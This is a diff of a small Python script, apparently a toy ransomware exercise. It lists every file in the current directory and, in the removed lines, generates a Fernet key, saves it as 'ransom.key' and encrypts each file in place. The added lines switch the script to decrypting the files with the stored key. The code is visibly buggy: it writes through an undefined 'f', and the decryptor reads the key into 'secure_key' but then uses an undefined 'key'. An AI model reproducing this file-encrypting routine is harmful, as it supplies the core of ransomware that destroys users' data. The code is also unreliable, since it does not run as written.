@@ -12,16 +12,15 @@ for file in os.listdir():
 
     files.append(file)
 
-key = Fernet.generate_key()
 
-with open("ransom.key", "wb") as ransom_file:
-    f.write(key)
+with open("ransom.key", "rb") as ransom_key:
+    secure_key = ransom_key.read()
 
 for file in files:
     with open(file, "rb") as ransom_file_read:
         contents = ransom_file_read.read()
 
-    contents_encrypted = Fernet(key).encrypt(contents)
+    contents_decrypted = Fernet(key).decrypt(contents)
 
     with open(file, "wb") as ransom_file_write:
-        ransom_file_write.write(contents_encrypted)
+        ransom_file_write.write(contents_decrypted)
